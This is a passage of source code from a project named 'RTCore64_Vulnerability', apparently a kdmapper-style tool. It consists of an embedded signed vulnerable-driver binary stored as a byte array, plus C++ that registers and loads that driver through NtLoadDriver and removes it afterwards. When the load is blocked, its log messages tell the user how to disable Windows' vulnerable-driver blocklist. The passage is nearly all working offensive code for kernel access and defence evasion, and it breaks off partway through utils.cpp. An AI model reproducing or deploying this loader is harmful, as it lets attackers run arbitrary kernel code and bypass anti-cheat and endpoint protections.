	  0xcb, 0xab, 0x1c, 0x4c, 0x70, 0x07, 0xa1, 0x3d, 0x0a, 0x30, 0xcd, 0x15, 0x8d, 0x4f, 0xf8, 0xdd,
	  0xd4, 0x8c, 0x50, 0x15, 0x1c, 0xef, 0x50, 0xee, 0xc4, 0x2e, 0xf7, 0xfc, 0xe9, 0x52, 0xf2, 0x91,
	  0x7d, 0xe0, 0x6d, 0xd5, 0x35, 0x30, 0x8e, 0x5e, 0x43, 0x73, 0xf2, 0x41, 0xe9, 0xd5, 0x6a, 0xe3,
	  0xb2, 0x89, 0x3a, 0x56, 0x39, 0x38, 0x6f, 0x06, 0x3c, 0x88, 0x69, 0x5b, 0x2a, 0x4d, 0xc5, 0xa7,
	  0x54, 0xb8, 0x6c, 0x89, 0xcc, 0x9b, 0xf9, 0x3c, 0xca, 0xe5, 0xfd, 0x89, 0xf5, 0x12, 0x3c, 0x92,
	  0x78, 0x96, 0xd6, 0xdc, 0x74, 0x6e, 0x93, 0x44, 0x61, 0xd1, 0x8d, 0xc7, 0x46, 0xb2, 0x75, 0x0e,
	  0x86, 0xe8, 0x19, 0x8a, 0xd5, 0x6d, 0x6c, 0xd5, 0x78, 0x16, 0x95, 0xa2, 0xe9, 0xc8, 0x0a, 0x38,
	  0xeb, 0xf2, 0x24, 0x13, 0x4f, 0x73, 0x54, 0x93, 0x13, 0x85, 0x3a, 0x1b, 0xbc, 0x1e, 0x34, 0xb5,
	  0x8b, 0x05, 0x8c, 0xb9, 0x77, 0x8b, 0xb1, 0xdb, 0x1f, 0x20, 0x91, 0xab, 0x09, 0x53, 0x6e, 0x90,
	  0xce, 0x7b, 0x37, 0x74, 0xb9, 0x70, 0x47, 0x91, 0x22, 0x51, 0x63, 0x16, 0x79, 0xae, 0xb1, 0xae,
	  0x41, 0x26, 0x08, 0xc8, 0x19, 0x2b, 0xd1, 0x46, 0xaa, 0x48, 0xd6, 0x64, 0x2a, 0xd7, 0x83, 0x34,
	  0xff, 0x2c, 0x2a, 0xc1, 0x6c, 0x19, 0x43, 0x4a, 0x07, 0x85, 0xe7, 0xd3, 0x7c, 0xf6, 0x21, 0x68,
	  0xef, 0xea, 0xf2, 0x52, 0x9f, 0x7f, 0x93, 0x90, 0xcf, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x82,
	  0x01, 0x23, 0x30, 0x82, 0x01, 0x1f, 0x30, 0x11, 0x06, 0x03, 0x55, 0x1d, 0x20, 0x04, 0x0a, 0x30,
	  0x08, 0x30, 0x06, 0x06, 0x04, 0x55, 0x1d, 0x20, 0x00, 0x30, 0x36, 0x06, 0x09, 0x2b, 0x06, 0x01,
	  0x04, 0x01, 0x82, 0x37, 0x15, 0x07, 0x04, 0x29, 0x30, 0x27, 0x06, 0x1f, 0x2b, 0x06, 0x01, 0x04,
	  0x01, 0x82, 0x37, 0x15, 0x08, 0x8d, 0xe0, 0xd1, 0x89, 0x4e, 0x84, 0xd7, 0x9c, 0xc3, 0x07, 0x86,
	  0xa6, 0x86, 0xfb, 0x1c, 0x8f, 0xd3, 0xbf, 0xa6, 0x15, 0x01, 0x19, 0x02, 0x01, 0x6e, 0x02, 0x01,
	  0x00, 0x30, 0x0b, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x04, 0x04, 0x03, 0x02, 0x01, 0x86, 0x30, 0x0f,
	  0x06, 0x03, 0x55, 0x1d, 0x13, 0x01, 0x01, 0xff, 0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xff, 0x30,
	  0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x60, 0x7b, 0x66, 0x1a, 0x45, 0x0d,
	  0x97, 0xca, 0x89, 0x50, 0x2f, 0x7d, 0x04, 0xcd, 0x34, 0xa8, 0xff, 0xfc, 0xfd, 0x4b, 0x30, 0x1d,
	  0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x04, 0x10, 0x1e, 0x0e, 0x00,
	  0x43, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x73, 0x00, 0x73, 0x00, 0x43, 0x00, 0x41, 0x30, 0x1f, 0x06,
	  0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x62, 0xfb, 0x0a, 0x21, 0x5b, 0x7f,
	  0x43, 0x6e, 0x11, 0xda, 0x09, 0x54, 0x50, 0x6b, 0xf5, 0xd2, 0x96, 0x71, 0xf1, 0x9e, 0x30, 0x55,
	  0x06, 0x03, 0x55, 0x1d, 0x1f, 0x04, 0x4e, 0x30, 0x4c, 0x30, 0x4a, 0xa0, 0x48, 0xa0, 0x46, 0x86,
	  0x44, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x72, 0x6c, 0x2e, 0x6d, 0x69, 0x63, 0x72,
	  0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x70, 0x6b, 0x69, 0x2f, 0x63, 0x72,
	  0x6c, 0x2f, 0x70, 0x72, 0x6f, 0x64, 0x75, 0x63, 0x74, 0x73, 0x2f, 0x4d, 0x69, 0x63, 0x72, 0x6f,
	  0x73, 0x6f, 0x66, 0x74, 0x43, 0x6f, 0x64, 0x65, 0x56, 0x65, 0x72, 0x69, 0x66, 0x52, 0x6f, 0x6f,
	  0x74, 0x2e, 0x63, 0x72, 0x6c, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01,
	  0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x02, 0x01, 0x00, 0x13, 0xc5, 0x6c, 0x5e, 0x07, 0x7f, 0x3c,
	  0x57, 0xff, 0x9b, 0x31, 0x5f, 0x3f, 0xbd, 0x95, 0x54, 0x25, 0xc6, 0x79, 0xf9, 0x2c, 0x31, 0x03,
	  0x4d, 0x64, 0x69, 0x4b, 0x56, 0xd9, 0x5b, 0x97, 0x6f, 0x7c, 0xf3, 0xf0, 0xd0, 0x24, 0x65, 0x75,
	  0x38, 0x63, 0x98, 0x13, 0x70, 0x16, 0x13, 0xf7, 0xa7, 0x01, 0xf1, 0xc6, 0x23, 0xe0, 0x85, 0x86,
	  0x6c, 0x0b, 0xf0, 0x80, 0x94, 0x5a, 0x75, 0xe8, 0x7c, 0xe4, 0x1e, 0x92, 0xb4, 0x73, 0xbf, 0xc1,
	  0xb3, 0xa7, 0xb0, 0x0b, 0xd3, 0x18, 0x84, 0xcb, 0xcc, 0x09, 0xa3, 0x5c, 0x9c, 0x4f, 0x3e, 0xb0,
	  0x3a, 0x9c, 0x2d, 0x1b, 0xc4, 0x04, 0xef, 0x97, 0x37, 0x96, 0x6f, 0xe5, 0xec, 0xba, 0xac, 0x6a,
	  0xb3, 0xd4, 0xe2, 0x3c, 0xdf, 0x8b, 0x25, 0xe7, 0xac, 0xbc, 0x62, 0x45, 0x31, 0xdd, 0xa4, 0x0a,
	  0x72, 0xe4, 0x1b, 0xf8, 0x78, 0x43, 0x01, 0xcc, 0xba, 0x39, 0x14, 0xde, 0x5d, 0x90, 0xae, 0xd8,
	  0x5a, 0xcf, 0x5e, 0xca, 0x46, 0x81, 0x51, 0x33, 0xd5, 0xa6, 0x0e, 0x58, 0x67, 0xd3, 0xd8, 0x66,
	  0x58, 0x88, 0x16, 0x9b, 0xee, 0xb1, 0x1a, 0xca, 0xad, 0x91, 0x13, 0x84, 0x21, 0xda, 0x9a, 0x6e,
	  0x20, 0xef, 0xda, 0x00, 0x74, 0x28, 0xba, 0xc9, 0x5f, 0xf3, 0x4d, 0x5d, 0xc3, 0xda, 0x25, 0x69,
	  0x25, 0x54, 0xea, 0x44, 0xbc, 0xc3, 0x9b, 0x29, 0x33, 0x1c, 0xd6, 0x3c, 0x96, 0x1f, 0x87, 0x81,
	  0xc5, 0x53, 0xd7, 0x2a, 0x27, 0x33, 0xd4, 0x2e, 0x19, 0x7c, 0x08, 0x58, 0x6d, 0xdb, 0x4e, 0x19,
	  0x99, 0xa9, 0xea, 0x5f, 0xf3, 0x9a, 0x9d, 0x8c, 0x51, 0x3a, 0x5a, 0x5c, 0xbd, 0x2f, 0xa9, 0x08,
	  0x35, 0x9b, 0x54, 0xa7, 0xdb, 0x35, 0x1a, 0x52, 0x16, 0x33, 0x34, 0x3a, 0xa3, 0x80, 0x04, 0x6a,
	  0xfd, 0xb4, 0x83, 0x8c, 0xad, 0x90, 0xcf, 0x0c, 0x3a, 0x65, 0x96, 0xec, 0x33, 0x4e, 0x18, 0x26,
	  0xb8, 0x49, 0xbb, 0xeb, 0x81, 0x92, 0xff, 0x13, 0x4d, 0x32, 0x4b, 0x23, 0xc7, 0x33, 0xe7, 0xb6,
	  0x71, 0x6b, 0x15, 0xf6, 0x9c, 0x80, 0xe6, 0xbc, 0xb7, 0x6c, 0xbe, 0x41, 0xd5, 0x03, 0x3a, 0x71,
	  0x33, 0x15, 0x00, 0x50, 0x74, 0x3b, 0x0e, 0x5d, 0xf9, 0x96, 0xaa, 0xed, 0x90, 0x3e, 0xab, 0x13,
	  0x4c, 0x80, 0x99, 0x26, 0xbc, 0x38, 0xa5, 0xeb, 0x02, 0x36, 0x89, 0x1d, 0xb6, 0x20, 0xbe, 0x83,
	  0xab, 0x10, 0xf8, 0x19, 0x9e, 0xd7, 0x63, 0x79, 0xd4, 0xae, 0xb1, 0x2f, 0x61, 0x36, 0xf9, 0x4a,
	  0x4b, 0xa8, 0x33, 0xc7, 0x0e, 0x72, 0x41, 0xf9, 0xf1, 0xb1, 0x90, 0x7e, 0xae, 0x46, 0xef, 0xde,
	  0x39, 0x7b, 0x75, 0xa0, 0x41, 0x14, 0x59, 0x04, 0x1d, 0x42, 0xbc, 0x47, 0x88, 0xb8, 0x13, 0x0e,
	  0x05, 0xfa, 0x1d, 0xf0, 0x80, 0x8d, 0xff, 0x70, 0xc6, 0x77, 0xd8, 0x4b, 0xdc, 0x46, 0x0e, 0x23,
	  0x1a, 0x72, 0xd5, 0xbf, 0xde, 0xfe, 0xaa, 0xae, 0x69, 0x58, 0x3c, 0xfc, 0x5c, 0x46, 0xe4, 0xd5,
	  0x81, 0x9a, 0x8b, 0x6e, 0x65, 0x59, 0x77, 0x1a, 0x32, 0xa5, 0x90, 0xa6, 0xb6, 0x64, 0x93, 0x64,
	  0xfd, 0x07, 0x53, 0xc9, 0xa0, 0xde, 0x28, 0xad, 0x2a, 0x6c, 0xc6, 0x38, 0xd1, 0x81, 0xce, 0x98,
	  0xf5, 0x40, 0x19, 0xe9, 0x2c, 0x17, 0x43, 0xa4, 0x26, 0x5f, 0xd3, 0x44, 0x30, 0x53, 0xe4, 0x1d,
	  0x02, 0xba, 0xa4, 0x0a, 0x2f, 0x16, 0xdd, 0x7a, 0x60, 0x27, 0x52, 0x42, 0xbb, 0xad, 0x98, 0x37,
	  0x28, 0x97, 0xe4, 0xb8, 0xd2, 0x79, 0x11, 0xe3, 0x10, 0x8c, 0x48, 0xd5, 0x30, 0x5d, 0x0a, 0x0c,
	  0x52, 0xde, 0xf5, 0x88, 0xea, 0x8d, 0x1a, 0x2d, 0x67, 0xc9, 0xf4, 0x80, 0x14, 0x84, 0xb7, 0x85,
	  0x0c, 0xd1, 0x66, 0x28, 0xa5, 0xc6, 0x6f, 0x24, 0x61, 0x31, 0x82, 0x04, 0xa6, 0x30, 0x82, 0x04,
	  0xa2, 0x02, 0x01, 0x01, 0x30, 0x67, 0x30, 0x51, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04,
	  0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x10,
	  0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d, 0x73, 0x61,
	  0x31, 0x27, 0x30, 0x25, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1e, 0x47, 0x6c, 0x6f, 0x62, 0x61,
	  0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x43, 0x6f, 0x64, 0x65, 0x53, 0x69, 0x67, 0x6e, 0x69, 0x6e,
	  0x67, 0x20, 0x43, 0x41, 0x20, 0x2d, 0x20, 0x47, 0x32, 0x02, 0x12, 0x11, 0x21, 0x58, 0x04, 0x48,
	  0x63, 0xe4, 0xdc, 0x19, 0xcf, 0x29, 0xa8, 0x56, 0x68, 0xb7, 0xf4, 0x58, 0x42, 0x30, 0x09, 0x06,
	  0x05, 0x2b, 0x0e, 0x03, 0x02, 0x1a, 0x05, 0x00, 0xa0, 0x70, 0x30, 0x10, 0x06, 0x0a, 0x2b, 0x06,
	  0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0c, 0x31, 0x02, 0x30, 0x00, 0x30, 0x19, 0x06, 0x09,
	  0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x03, 0x31, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01,
	  0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0x30, 0x1c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01,
	  0x82, 0x37, 0x02, 0x01, 0x0b, 0x31, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01,
	  0x82, 0x37, 0x02, 0x01, 0x15, 0x30, 0x23, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01,
	  0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xa4, 0xc7, 0x26, 0x41, 0x4a, 0x4b, 0x7f, 0x74, 0x48, 0x2f,
	  0x9b, 0xb3, 0x60, 0x55, 0xe0, 0x20, 0xe1, 0xed, 0x3c, 0xea, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86,
	  0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x82, 0x01, 0x00, 0x44, 0x18, 0xb5,
	  0x07, 0xdf, 0xb7, 0x68, 0xb3, 0xc2, 0xb5, 0x45, 0xf3, 0xda, 0x48, 0xd0, 0xa8, 0x24, 0x54, 0xf2,
	  0x83, 0x7c, 0xe8, 0x87, 0x9b, 0x8c, 0x54, 0x6f, 0xe8, 0x04, 0xdc, 0xc9, 0x82, 0x1d, 0x13, 0x52,
	  0xcd, 0x5f, 0xfa, 0x48, 0x91, 0x36, 0x42, 0xa5, 0xed, 0x3d, 0x9b, 0x03, 0x35, 0xe2, 0x08, 0x7e,
	  0x0c, 0xd2, 0x3b, 0xb5, 0x4a, 0x92, 0xf8, 0x03, 0x24, 0xbb, 0x12, 0x6d, 0xea, 0x56, 0xeb, 0x46,
	  0xf6, 0x91, 0x83, 0xa7, 0xda, 0x1a, 0x1b, 0x8d, 0x74, 0x75, 0xd3, 0x12, 0x52, 0xe4, 0x2c, 0xdb,
	  0x10, 0x1a, 0x43, 0x4a, 0x33, 0x82, 0x55, 0x45, 0x66, 0xb9, 0x2a, 0xb0, 0x63, 0xa9, 0x3c, 0xd5,
	  0xa0, 0x91, 0xf9, 0x9a, 0xa2, 0x48, 0x0c, 0x78, 0xb2, 0x94, 0x3a, 0xf4, 0x87, 0x24, 0xe1, 0xb9,
	  0x8f, 0xbc, 0xaa, 0x7c, 0x65, 0x2c, 0x85, 0xeb, 0xde, 0xa9, 0xad, 0xdb, 0x9a, 0x25, 0xfe, 0x81,
	  0xf7, 0x08, 0xde, 0xfb, 0xbb, 0x74, 0x9f, 0x95, 0xce, 0xd7, 0xa4, 0xa4, 0x8a, 0xd5, 0xba, 0x75,
	  0x71, 0x57, 0x08, 0x3d, 0x9a, 0x1e, 0x8d, 0x48, 0xcc, 0x46, 0xfb, 0xf7, 0x7c, 0xcf, 0x09, 0x9c,
	  0xb3, 0xba, 0x37, 0x5c, 0x21, 0xc3, 0x31, 0x27, 0xc7, 0x4c, 0xd7, 0x6b, 0x4a, 0xa2, 0x7d, 0xa2,
	  0x8d, 0x36, 0x8b, 0x7a, 0x0c, 0x5e, 0x87, 0xd4, 0x69, 0x7e, 0xe0, 0x5a, 0x3b, 0x30, 0xb2, 0x1c,
	  0xe2, 0xfa, 0x8b, 0x38, 0xd2, 0xf0, 0xaa, 0xbf, 0x00, 0xfa, 0x37, 0xfe, 0x99, 0x24, 0xbd, 0x45,
	  0xc3, 0x6b, 0xd4, 0x0a, 0xab, 0x6d, 0xd8, 0x45, 0xd1, 0xf2, 0xff, 0xa2, 0x8d, 0x4f, 0xbf, 0x37,
	  0x91, 0x08, 0x7e, 0x81, 0x95, 0xd1, 0xb7, 0x84, 0x65, 0xf5, 0xd6, 0xdd, 0x35, 0x0d, 0xbf, 0xe5,
	  0xdc, 0xee, 0xfa, 0x50, 0x97, 0x9d, 0x1f, 0x3f, 0xdb, 0x11, 0xf3, 0xb2, 0x03, 0xa1, 0x82, 0x02,
	  0xa2, 0x30, 0x82, 0x02, 0x9e, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x06,
	  0x31, 0x82, 0x02, 0x8f, 0x30, 0x82, 0x02, 0x8b, 0x02, 0x01, 0x01, 0x30, 0x68, 0x30, 0x52, 0x31,
	  0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17,
	  0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67,
	  0x6e, 0x20, 0x6e, 0x76, 0x2d, 0x73, 0x61, 0x31, 0x28, 0x30, 0x26, 0x06, 0x03, 0x55, 0x04, 0x03,
	  0x13, 0x1f, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x54, 0x69, 0x6d,
	  0x65, 0x73, 0x74, 0x61, 0x6d, 0x70, 0x69, 0x6e, 0x67, 0x20, 0x43, 0x41, 0x20, 0x2d, 0x20, 0x47,
	  0x32, 0x02, 0x12, 0x11, 0x21, 0xd6, 0x99, 0xa7, 0x64, 0x97, 0x3e, 0xf1, 0xf8, 0x42, 0x7e, 0xe9,
	  0x19, 0xcc, 0x53, 0x41, 0x14, 0x30, 0x09, 0x06, 0x05, 0x2b, 0x0e, 0x03, 0x02, 0x1a, 0x05, 0x00,
	  0xa0, 0x81, 0xfd, 0x30, 0x18, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x03,
	  0x31, 0x0b, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x01, 0x30, 0x1c, 0x06,
	  0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x05, 0x31, 0x0f, 0x17, 0x0d, 0x31, 0x37,
	  0x30, 0x38, 0x32, 0x37, 0x31, 0x34, 0x34, 0x34, 0x34, 0x30, 0x5a, 0x30, 0x23, 0x06, 0x09, 0x2a,
	  0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xd1, 0x3d, 0x24, 0xd4,
	  0xc7, 0xf2, 0xef, 0x11, 0x5e, 0xec, 0x9b, 0xfe, 0x15, 0xc1, 0xe7, 0xba, 0x25, 0xd7, 0xad, 0xa3,
	  0x30, 0x81, 0x9d, 0x06, 0x0b, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x10, 0x02, 0x0c,
	  0x31, 0x81, 0x8d, 0x30, 0x81, 0x8a, 0x30, 0x81, 0x87, 0x30, 0x81, 0x84, 0x04, 0x14, 0x63, 0xb8,
	  0x2f, 0xab, 0x61, 0xf5, 0x83, 0x90, 0x96, 0x95, 0x05, 0x0b, 0x00, 0x24, 0x9c, 0x50, 0x29, 0x33,
	  0xec, 0x79, 0x30, 0x6c, 0x30, 0x56, 0xa4, 0x54, 0x30, 0x52, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03,
	  0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a,
	  0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d,
	  0x73, 0x61, 0x31, 0x28, 0x30, 0x26, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1f, 0x47, 0x6c, 0x6f,
	  0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x54, 0x69, 0x6d, 0x65, 0x73, 0x74, 0x61, 0x6d,
	  0x70, 0x69, 0x6e, 0x67, 0x20, 0x43, 0x41, 0x20, 0x2d, 0x20, 0x47, 0x32, 0x02, 0x12, 0x11, 0x21,
	  0xd6, 0x99, 0xa7, 0x64, 0x97, 0x3e, 0xf1, 0xf8, 0x42, 0x7e, 0xe9, 0x19, 0xcc, 0x53, 0x41, 0x14,
	  0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04,
	  0x82, 0x01, 0x00, 0x5e, 0x5b, 0x6e, 0x27, 0x00, 0x1f, 0x49, 0xe0, 0x8f, 0xdf, 0x40, 0xa5, 0x2f,
	  0x2a, 0x59, 0x96, 0xda, 0x23, 0xbb, 0x32, 0xec, 0x8b, 0x8a, 0xe2, 0xe2, 0x78, 0xd1, 0x60, 0x6b,
	  0x43, 0x0a, 0x41, 0x0f, 0x44, 0x34, 0x16, 0xb1, 0x81, 0x2e, 0x6f, 0x9f, 0x72, 0x97, 0x11, 0x44,
	  0x50, 0xf2, 0xdb, 0x17, 0x85, 0x38, 0x54, 0x4d, 0x60, 0x2f, 0xb8, 0x28, 0xb0, 0xe1, 0xc3, 0xe0,
	  0x62, 0x35, 0x1c, 0x7e, 0xaa, 0x59, 0x27, 0x7c, 0xce, 0x04, 0xc1, 0x3b, 0x12, 0xb0, 0xcb, 0xed,
	  0x11, 0x71, 0xcf, 0x0c, 0x71, 0x4b, 0x68, 0x49, 0x06, 0x71, 0xfe, 0x0a, 0x62, 0x72, 0xea, 0xeb,
	  0x75, 0x3d, 0xb6, 0xd2, 0x41, 0x43, 0xda, 0xe7, 0x3d, 0xa6, 0x7e, 0x4c, 0xc1, 0x51, 0x20, 0x92,
	  0x73, 0x40, 0x39, 0x1e, 0x63, 0x97, 0x1d, 0x7a, 0x22, 0x4d, 0x17, 0xba, 0x1b, 0x74, 0xa5, 0x32,
	  0x68, 0x4c, 0x53, 0x0e, 0x03, 0x6d, 0x67, 0x2b, 0xab, 0xa7, 0xd4, 0xd8, 0x80, 0xd1, 0xc0, 0xa3,
	  0xaf, 0xe0, 0x3b, 0xd2, 0x30, 0x78, 0x74, 0x27, 0x8a, 0xfa, 0xa4, 0xe6, 0x5f, 0x13, 0x64, 0x79,
	  0xd9, 0x57, 0xe6, 0x0d, 0xb3, 0xd3, 0xcb, 0x52, 0xba, 0xe4, 0xdb, 0x77, 0x88, 0x43, 0xd4, 0x6e,
	  0x1f, 0x4b, 0x4c, 0xde, 0xaa, 0x20, 0xbe, 0x0c, 0x6e, 0xcd, 0xde, 0x35, 0x8d, 0x67, 0xf8, 0x2c,
	  0x2f, 0x51, 0x7e, 0xba, 0xc8, 0xb6, 0xec, 0x9e, 0xb6, 0x6b, 0xa9, 0x08, 0x13, 0x0f, 0xbf, 0xc9,
	  0x48, 0x90, 0xf1, 0x12, 0xa5, 0xeb, 0x75, 0xfe, 0xac, 0x37, 0x87, 0xc3, 0x98, 0x99, 0x0e, 0x26,
	  0x5a, 0x91, 0xe5, 0xfe, 0x2c, 0xfc, 0x5d, 0x68, 0x55, 0x3f, 0x96, 0xec, 0x39, 0xb3, 0x04, 0x79,
	  0xd0, 0x3b, 0xbf, 0xa0, 0x17, 0xe3, 0xcd, 0x9e, 0x73, 0xca, 0xc4, 0x72, 0x07, 0x62, 0xd6, 0x53,
	  0xf2, 0xb9, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00
	};
}
```

`RTCore64_Vulnerability/service.cpp`:

```cpp
#include "service.hpp"

bool service::RegisterAndStart(const std::wstring& driver_path) {
	const static DWORD ServiceTypeKernel = 1;
	const std::wstring driver_name = intel_driver::GetDriverNameW();
	const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
	const std::wstring nPath = L"\\??\\" + driver_path;

	HKEY dservice;
	LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice); //Returns Ok if already exists
	if (status != ERROR_SUCCESS) {
		Log("[-] Can't create service key" << std::endl);
		return false;
	}

	status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size()*sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'ImagePath' registry value" << std::endl);
		return false;
	}
	
	status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'Type' registry value" << std::endl);
		return false;
	}
	
	RegCloseKey(dservice);

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return false;
	}

	auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	auto NtLoadDriver = (nt::NtLoadDriver)GetProcAddress(ntdll, "NtLoadDriver");

	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator." << std::endl);
		return false;
	}

	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	Status = NtLoadDriver(&serviceStr);


	Log("[+] NtLoadDriver Status 0x" << std::hex << Status << std::endl);

	if (Status == 0xC0000603) { //STATUS_IMAGE_CERT_REVOKED
		Log("[-] Your vulnerable driver list is enabled and have blocked the driver loading, you must disable vulnerable driver list to use kdmapper with intel driver" << std::endl);
		Log("[-] Registry path to disable vulnerable driver list: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config" << std::endl);
		Log("[-] Set 'VulnerableDriverBlocklistEnable' as dword to 0" << std::endl);
	}
	
	
	//Never should occur since kdmapper checks for "IsRunning" driver before
	if (Status == 0xC000010E) {// STATUS_IMAGE_ALREADY_LOADED
		return true;
	}
	
	return NT_SUCCESS(Status);
}

bool service::StopAndRemove(const std::wstring& driver_name) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
		return false;

	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	HKEY driver_service;
	std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
	LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
	if (status != ERROR_SUCCESS) {
		if (status == ERROR_FILE_NOT_FOUND) {
			return true;
		}
		return false;
	}
	RegCloseKey(driver_service);

	auto NtUnloadDriver = (nt::NtUnloadDriver)GetProcAddress(ntdll, "NtUnloadDriver");
	NTSTATUS st = NtUnloadDriver(&serviceStr);
	Log("[+] NtUnloadDriver Status 0x" << std::hex << st << std::endl);
	if (st != 0x0) {
		Log("[-] Driver Unload Failed!!" << std::endl);
		status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
		return false; //lets consider unload fail as error because can cause problems with anti cheats later
	}
	

	status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
	if (status != ERROR_SUCCESS) {
		return false;
	}
	return true;
}

```

`RTCore64_Vulnerability/service.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <string>

#include "intel_driver.hpp"

namespace service
{
	bool RegisterAndStart(const std::wstring& driver_path);
	bool StopAndRemove(const std::wstring& driver_name);
};
```

`RTCore64_Vulnerability/utils.cpp`:

```cpp
#include "utils.hpp"

std::wstring utils::GetFullTempPath() {
	wchar_t temp_directory[MAX_PATH + 1] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
		Log(L"[-] Failed to get temp path" << std::endl);
		return L"";
	}
	if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
		temp_directory[wcslen(temp_directory) - 1] = 0x0;

	return std::wstring(temp_directory);
}

bool utils::ReadFileToMemory(const std::wstring& file_path, std::vector<uint8_t>* out_buffer) {
	std::ifstream file_ifstream(file_path, std::ios::binary);

